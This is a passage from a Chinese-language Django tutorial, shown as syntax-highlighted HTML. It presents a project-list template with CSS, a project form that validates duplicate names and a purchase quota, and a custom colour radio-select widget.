class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/manage.html' %&#125;</span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.project</span> &#123;</span></span><br><span class="line">            margin-top: 10px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-body</span> &#123;</span></span><br><span class="line">            padding: 0;</span><br><span class="line">            display: flex;</span><br><span class="line">        &#123;# 采用flex样式 #&#125; flex-direction: row;</span><br><span class="line">        &#123;# 按行显示 #&#125; justify-content: left;</span><br><span class="line">        &#123;# 从左边开始 #&#125; align-items: flex-start;</span><br><span class="line">        &#123;# 垂直方向 #&#125; flex-wrap: wrap;</span><br><span class="line">        &#123;# 自动换行 #&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-body</span> &gt; <span class="selector-class">.item</span> &#123;</span></span><br><span class="line">            border-radius: 6px;</span><br><span class="line">            width: 228px;</span><br><span class="line"><span class="css">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dddddd</span>;</span></span><br><span class="line">            margin: 20px 10px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-body</span> &gt; <span class="selector-class">.item</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#f0ad4e</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-body</span> &gt; <span class="selector-class">.item</span> &gt; <span class="selector-class">.title</span> &#123;</span></span><br><span class="line">            height: 104px;</span><br><span class="line">            color: white;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            border-top-left-radius: 6px;</span><br><span class="line">            border-top-right-radius: 6px;</span><br><span class="line">            font-size: 15px;</span><br><span class="line">            text-decoration: none;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-body</span> &gt; <span class="selector-class">.item</span> &gt; <span class="selector-class">.info</span> &#123;</span></span><br><span class="line">            padding: 10px 10px;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: space-between;</span><br><span class="line">            border-bottom-left-radius: 6px;</span><br><span class="line">            border-bottom-right-radius: 6px;</span><br><span class="line"><span class="css">            <span class="selector-tag">color</span>: <span class="selector-id">#8c8c8c</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-body</span> &gt; <span class="selector-class">.item</span> &gt; <span class="selector-class">.info</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line">            text-decoration: none;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.panel-body</span> &gt; <span class="selector-class">.item</span> &gt; <span class="selector-class">.info</span> <span class="selector-class">.fa-star</span> &#123;</span></span><br><span class="line">            font-size: 18px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.color-radio</span> <span class="selector-tag">label</span>&#123;</span></span><br><span class="line">            margin-left: 0;</span><br><span class="line">            padding-left: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.color-radio</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">"radio"</span>]</span>&#123;</span></span><br><span class="line">            display: none;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.color-radio</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">"radio"</span>]</span> + <span class="selector-class">.cycle</span>&#123;</span></span><br><span class="line">            display: inline-block;</span><br><span class="line">            height: 25px;</span><br><span class="line">            width: 25px;</span><br><span class="line">            border-radius: 50%;</span><br><span class="line"><span class="css">            <span class="selector-tag">border</span>: 2<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dddddd</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.color-radio</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">"radio"</span>]</span><span class="selector-pseudo">:checked</span> + <span class="selector-class">.cycle</span>&#123;</span></span><br><span class="line">            border: 2px solid black;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container-fluid project"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"margin: 10px 0;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">data-toggle</span>=<span class="string">"modal"</span> <span class="attr">data-target</span>=<span class="string">"#addModal"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-plus"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 新建项目</span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-star"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 星标项目<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                &#123;% for item in project_dict.star %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'dashboard' project_id=item.value.id%&#125;"</span> <span class="attr">class</span>=<span class="string">"title"</span></span></span><br><span class="line"><span class="tag">                           <span class="attr">style</span>=<span class="string">"background-color: &#123;&#123; item.value.get_color_display &#125;&#125;"</span>&gt;</span>&#123;&#123; item.value.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"info"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'project_unstar' project_type=item.type project_id=item.value.id %&#125;"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-star"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> <span class="attr">style</span>=<span class="string">"color: #f0ad4e"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.value.creator.username &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-user-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.value.join_count &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-align-justify"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 我创建的项目<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                &#123;% for item in project_dict.my %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'dashboard' project_id=item.id%&#125;"</span> <span class="attr">class</span>=<span class="string">"title"</span></span></span><br><span class="line"><span class="tag">                           <span class="attr">style</span>=<span class="string">"background-color: &#123;&#123; item.get_color_display &#125;&#125;"</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"info"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'project_star' project_type='my'  project_id=item.id %&#125;"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-star"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> <span class="attr">style</span>=<span class="string">"color: #8c8c8c"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.creator.username &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-user-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.join_count &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-handshake-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> 我参与的项目<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                &#123;% for item in project_dict.join %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'dashboard' project_id=item.id%&#125;"</span> <span class="attr">class</span>=<span class="string">"title"</span></span></span><br><span class="line"><span class="tag">                           <span class="attr">style</span>=<span class="string">"background-color: &#123;&#123; item.get_color_display &#125;&#125;"</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"info"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'project_star' project_type='join'  project_id=item.id %&#125;"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-star"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> <span class="attr">style</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.creator.username &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-user-o"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.join_count &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Modal --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"addModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="symbol">&amp;times;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>新建项目<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"addForm"</span>&gt;</span></span><br><span class="line">                        &#123;% csrf_token %&#125;</span><br><span class="line">                        &#123;% for field in form %&#125;</span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; field.id_for_label &#125;&#125;"</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                                &#123;&#123; field &#125;&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>取 消<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btnSubmit"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>确 定<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block js %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// 创建项目，为确定按钮绑定事件</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="8-2-构建form表单"><a href="#8-2-构建form表单" class="headerlink" title="8.2 构建form表单"></a>8.2 构建form表单</h3><p>为了与登陆注册页面的form表单区分开，新建<code>project.py</code>文件，用于存放项目的form表单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"><span class="keyword">from</span> django.core.validators <span class="keyword">import</span> ValidationError</span><br><span class="line"><span class="keyword">from</span> web.forms.bootstrap <span class="keyword">import</span> BootSrtapForm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProjectModelForm</span><span class="params">(BootSrtapForm, forms.ModelForm)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># desc = forms.CharField(widget=forms.Textarea())</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Project</span><br><span class="line">        fields = [<span class="string">'name'</span>, <span class="string">'color'</span>, <span class="string">'desc'</span>]</span><br><span class="line">        widgets = &#123;</span><br><span class="line">            <span class="string">'color'</span>: forms.RadioSelect,</span><br><span class="line">            <span class="string">'desc'</span>: forms.Textarea,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,request,*args,**kwargs)</span>:</span></span><br><span class="line">        super().__init__(*args,**kwargs)</span><br><span class="line">        self.request = request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""项目进行校验"""</span></span><br><span class="line">        name = self.cleaned_data[<span class="string">'name'</span>]</span><br><span class="line">        <span class="comment"># 1.当前用户是否已经创建过</span></span><br><span class="line">        exists = models.Project.objects.filter(name=name,creator=self.request.tracer.user).exists()</span><br><span class="line">        <span class="keyword">if</span> exists:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'项目已存在'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2.当前用户是否还有额度</span></span><br><span class="line">        <span class="comment"># 最多创建的项目</span></span><br><span class="line">        <span class="comment"># self.request.tracer.price_policy.project_num</span></span><br><span class="line">        <span class="comment"># 已经创建的项目</span></span><br><span class="line">        count = models.Project.objects.filter(creator=self.request.tracer.user).count()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> count &gt;= self.request.tracer.price_policy.project_num:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'项目个数超限，请购买套餐'</span>)</span><br><span class="line">        <span class="keyword">return</span> name</span><br></pre></td></tr></table></figure><p>由于颜色选择框与理想的选择框不一样，所以重写的 <code>RadioSelect</code>的选择框</p><h3 id="8-3-重写RadioSelect-选择框"><a href="#8-3-重写RadioSelect-选择框" class="headerlink" title="8.3 重写RadioSelect 选择框"></a>8.3 重写RadioSelect 选择框</h3><ul><li>在forms文件夹下新建<code>widgets.py文件</code>重写RadioSelect 的代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.forms <span class="keyword">import</span> RadioSelect</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorRadioSelect</span><span class="params">(RadioSelect)</span>:</span></span><br><span class="line">    template_name = <span class="string">'widgets/color_radio/radio.html'</span></span><br><span class="line">    option_template_name = <span class="string">'widgets/color_radio/radio_option.html'</span></span><br></pre></td></tr></table></figure><ul><li>通过查看源码重写<code>radio.html文件</code> &amp; <code>radio_option.html 文件</code></li></ul><p>在templates文件夹下，创建widgets文件夹，用于存放<code>radio.html文件</code>  &amp;  <code>radio_option.html 文件</code>。</p><p><code>radio.html文件</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 